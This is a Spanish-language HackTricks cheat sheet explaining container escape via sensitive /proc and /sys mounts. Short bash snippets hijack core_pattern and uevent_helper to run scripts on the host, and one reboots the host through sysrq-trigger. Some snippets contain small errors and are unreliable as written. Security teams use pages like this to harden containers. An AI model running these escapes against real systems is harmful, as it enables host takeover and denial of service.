<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtén la [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


(_**Esta información fue tomada de**_ [_**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**_](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts))

Debido a la falta de soporte de namespace, la exposición de `/proc` y `/sys` ofrece una fuente de superficie de ataque significativa y divulgación de información. Numerosos archivos dentro de `procfs` y `sysfs` ofrecen un riesgo de escape de contenedor, modificación de host o divulgación de información básica que podría facilitar otros ataques.

Para abusar de estas técnicas, podría ser suficiente con **configurar algo mal como `-v /proc:/host/proc`** ya que AppArmor no protege `/host/proc` porque **AppArmor se basa en la ruta**.

# procfs

## /proc/sys

`/proc/sys` permite típicamente el acceso para modificar variables del kernel, a menudo controladas a través de `sysctl(2)`.

### /proc/sys/kernel/core\_pattern

[/proc/sys/kernel/core\_pattern](https://man7.org/linux/man-pages/man5/core.5.html) define un programa que se ejecuta en la generación de archivos de núcleo (típicamente un fallo del programa) y se pasa el archivo de núcleo como entrada estándar si el primer carácter de este archivo es un símbolo de tubería `|`. Este programa se ejecuta por el usuario root y permitirá hasta 128 bytes de argumentos de línea de comandos. Esto permitiría la ejecución trivial de código dentro del host del contenedor dado cualquier fallo y generación de archivo de núcleo (que se puede descartar fácilmente durante una miríada de acciones maliciosas).
```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes #For testing
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern
sleep 5 && ./crash &
```
### /proc/sys/kernel/modprobe

[/proc/sys/kernel/modprobe](https://man7.org/linux/man-pages/man5/proc.5.html) contiene la ruta al cargador de módulos del kernel, que se llama al cargar un módulo del kernel como a través del comando [modprobe](https://man7.org/linux/man-pages/man8/modprobe.8.html). La ejecución de código se puede obtener realizando cualquier acción que haga que el kernel intente cargar un módulo del kernel (como usar la cripto-API para cargar un módulo de criptografía actualmente no cargado, o usar ifconfig para cargar un módulo de red para un dispositivo que no se está utilizando actualmente).
```bash
# Check if you can directly access modprobe
ls -l `cat /proc/sys/kernel/modprobe`
```
### /proc/sys/vm/panic\_on\_oom

[/proc/sys/vm/panic\_on\_oom](https://man7.org/linux/man-pages/man5/proc.5.html) es una bandera global que determina si el kernel entrará en pánico cuando se alcance una condición de falta de memoria (OOM) (en lugar de invocar al OOM killer). Esto es más un ataque de denegación de servicio (DoS) que una fuga de contenedor, pero no deja de exponer una capacidad que solo debería estar disponible para el host.

### /proc/sys/fs

El directorio [/proc/sys/fs](https://man7.org/linux/man-pages/man5/proc.5.html) contiene una serie de opciones e información sobre varios aspectos del sistema de archivos, incluyendo cuotas, manejo de archivos, información de inodos y dentries. El acceso de escritura a este directorio permitiría varios ataques de denegación de servicio contra el host.

### /proc/sys/fs/binfmt\_misc

[/proc/sys/fs/binfmt\_misc](https://man7.org/linux/man-pages/man5/proc.5.html) permite la ejecución de formatos binarios diversos, lo que generalmente significa que se pueden registrar varios **intérpretes para formatos binarios no nativos** (como Java) basados en su número mágico. Puede hacer que el kernel ejecute un binario registrándolo como manejadores.\
Puede encontrar una explotación en [https://github.com/toffan/binfmt\_misc](https://github.com/toffan/binfmt\_misc): _Rootkit de hombre pobre, aprovecha la opción_ [_credentials_](https://github.com/torvalds/linux/blame/3bdb5971ffc6e87362787c770353eb3e54b7af30/Documentation/binfmt\_misc.txt#L62) _de_ [_binfmt\_misc_](https://github.com/torvalds/linux/raw/master/Documentation/admin-guide/binfmt-misc.rst) _para escalar privilegios a través de cualquier binario suid (y obtener una shell de root) si `/proc/sys/fs/binfmt_misc/register` es escribible._

Para obtener una explicación más detallada de esta técnica, consulte [https://www.youtube.com/watch?v=WBC7hhgMvQQ](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

## /proc/config.gz

[/proc/config.gz](https://man7.org/linux/man-pages/man5/proc.5.html) dependiendo de la configuración `CONFIG_IKCONFIG_PROC`, esto expone una versión comprimida de las opciones de configuración del kernel para el kernel en ejecución. Esto puede permitir que un contenedor comprometido o malintencionado descubra y apunte fácilmente a áreas vulnerables habilitadas en el kernel.

## /proc/sysrq-trigger

`Sysrq` es un mecanismo antiguo que se puede invocar a través de una combinación especial de teclas `SysRq`. Esto puede permitir un reinicio inmediato del sistema, emisión de `sync(2)`, remontaje de todos los sistemas de archivos como solo lectura, invocación de depuradores del kernel y otras operaciones.

Si el invitado no está correctamente aislado, puede activar los comandos [sysrq](https://www.kernel.org/doc/html/v4.11/admin-guide/sysrq.html) escribiendo caracteres en el archivo `/proc/sysrq-trigger`.
```bash
# Reboot the host
echo b > /proc/sysrq-trigger
```
## /proc/kmsg

[/proc/kmsg](https://man7.org/linux/man-pages/man5/proc.5.html) puede exponer mensajes del buffer de anillo del kernel que normalmente se acceden a través de `dmesg`. La exposición de esta información puede ayudar en la explotación del kernel, desencadenar fugas de direcciones del kernel (que podrían usarse para ayudar a derrotar la aleatorización del espacio de direcciones del kernel (KASLR)) y ser una fuente de divulgación general de información sobre el kernel, hardware, paquetes bloqueados y otros detalles del sistema.

## /proc/kallsyms

[/proc/kallsyms](https://man7.org/linux/man-pages/man5/proc.5.html) contiene una lista de símbolos exportados del kernel y sus ubicaciones de dirección para módulos dinámicos y cargables. Esto también incluye la ubicación de la imagen del kernel en la memoria física, lo que es útil para el desarrollo de la explotación del kernel. A partir de estas ubicaciones, se puede ubicar la dirección base o el desplazamiento del kernel, que se puede usar para superar la aleatorización del espacio de direcciones del kernel (KASLR).

Para sistemas con `kptr_restrict` establecido en `1` o `2`, este archivo existirá pero no proporcionará ninguna información de dirección (aunque el orden en que se enumeran los símbolos es idéntico al orden en la memoria).

## /proc/\[pid]/mem

[/proc/\[pid\]/mem](https://man7.org/linux/man-pages/man5/proc.5.html) expone interfaces al dispositivo de memoria del kernel `/dev/mem`. Si bien el PID Namespace puede proteger contra algunos ataques a través de este vector `procfs`, esta área ha sido históricamente vulnerable, luego se consideró segura y nuevamente se descubrió que era [vulnerable](https://git.zx2c4.com/CVE-2012-0056/about/) para la escalada de privilegios.

## /proc/kcore

[/proc/kcore](https://man7.org/linux/man-pages/man5/proc.5.html) representa la memoria física del sistema y está en un formato de núcleo ELF (que se encuentra típicamente en archivos de volcado de núcleo). No permite escribir en dicha memoria. La capacidad de leer este archivo (restringido a usuarios privilegiados) puede filtrar el contenido de la memoria del sistema anfitrión y otros contenedores.

El tamaño de archivo informado grande representa la cantidad máxima de memoria físicamente direccionable para la arquitectura y puede causar problemas al leerlo (o fallas dependiendo de la fragilidad del software).

[Volcado de /proc/kcore en 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/)

## /proc/kmem

`/proc/kmem` es una interfaz alternativa para [/dev/kmem](https://man7.org/linux/man-pages/man4/kmem.4.html) (acceso directo al cual está bloqueado por la lista blanca del dispositivo cgroup), que es un archivo de dispositivo de caracteres que representa la memoria virtual del kernel. Permite tanto la lectura como la escritura, lo que permite la modificación directa de la memoria del kernel.

## /proc/mem

`/proc/mem` es una interfaz alternativa para [/dev/mem](https://man7.org/linux/man-pages/man4/kmem.4.html) (acceso directo al cual está bloqueado por la lista blanca del dispositivo cgroup), que es un archivo de dispositivo de caracteres que representa la memoria física del sistema. Permite tanto la lectura como la escritura, lo que permite la modificación de toda la memoria. (Requiere un poco más de habilidad que `kmem`, ya que primero se deben resolver las direcciones virtuales a direcciones físicas).

## /proc/sched\_debug

`/proc/sched_debug` es un archivo especial que devuelve información de programación de procesos para todo el sistema. Esta información incluye nombres de procesos e identificadores de procesos de todas las namespaces, además de identificadores de cgroups de procesos. Esto efectivamente evita las protecciones del PID namespace y es legible por otros/mundo, por lo que también se puede explotar en contenedores no privilegiados.

## /proc/\[pid]/mountinfo

[/proc/\[pid\]/mountinfo](https://man7.org/linux/man-pages/man5/proc.5.html) contiene información sobre los puntos de montaje en el espacio de nombres de montaje del proceso. Expone la ubicación del `rootfs` o imagen del contenedor.

# sysfs

## /sys/kernel/uevent\_helper

Los `uevents` son eventos desencadenados por el kernel cuando se agrega o elimina un dispositivo. Es notable que la ruta para el `uevent_helper` se puede modificar escribiendo en `/sys/kernel/uevent_helper`. Luego, cuando se desencadena un `uevent` (que también se puede hacer desde el espacio de usuario escribiendo en archivos como `/sys/class/mem/null/uevent`), se ejecuta el `uevent_helper` malicioso.
```bash
# Creates a payload
cat "#!/bin/sh" > /evil-helper
cat "ps > /output" >> /evil-helper
chmod +x /evil-helper
# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
# Sets uevent_helper to /path/payload
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# Triggers a uevent
echo change > /sys/class/mem/null/uevent
# or else
# echo /sbin/poweroff > /sys/kernel/uevent_helper
# Reads the output
cat /output
```
## /sys/class/thermal

Acceso a ACPI y varios ajustes de hardware para el control de temperatura, típicamente encontrados en laptops o placas madre de gaming. Esto puede permitir ataques DoS contra el host del contenedor, lo que incluso puede llevar a daños físicos.

## /sys/kernel/vmcoreinfo

Este archivo puede filtrar direcciones del kernel que podrían ser utilizadas para derrotar KASLR.

## /sys/kernel/security

En `/sys/kernel/security` se monta la interfaz `securityfs`, que permite la configuración de los Módulos de Seguridad de Linux. Esto permite la configuración de las políticas de [AppArmor](https://gitlab.com/apparmor/apparmor/-/wikis/Kernel\_interfaces#securityfs-syskernelsecurityapparmor), y por lo tanto, el acceso a esto puede permitir que un contenedor deshabilite su sistema MAC.

## /sys/firmware/efi/vars

`/sys/firmware/efi/vars` expone interfaces para interactuar con las variables EFI en NVRAM. Aunque esto no es típicamente relevante para la mayoría de los servidores, EFI se está volviendo cada vez más popular. Debilidades en los permisos incluso han llevado a algunos laptops inutilizables.

## /sys/firmware/efi/efivars

`/sys/firmware/efi/efivars` proporciona una interfaz para escribir en la NVRAM utilizada para los argumentos de arranque UEFI. Modificarlos puede hacer que la máquina host no se pueda arrancar.

## /sys/kernel/debug

`debugfs` proporciona una interfaz "sin reglas" mediante la cual el kernel (o los módulos del kernel) pueden crear interfaces de depuración accesibles a userland. Ha tenido varios problemas de seguridad en el pasado, y las directrices "sin reglas" detrás del sistema de archivos a menudo han chocado con las restricciones de seguridad.

# Referencias

* [Comprendiendo y endureciendo los contenedores de Linux](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
* [Abusando de contenedores de Linux privilegiados y no privilegiados](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!

- Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)

- Consigue el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)

- **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
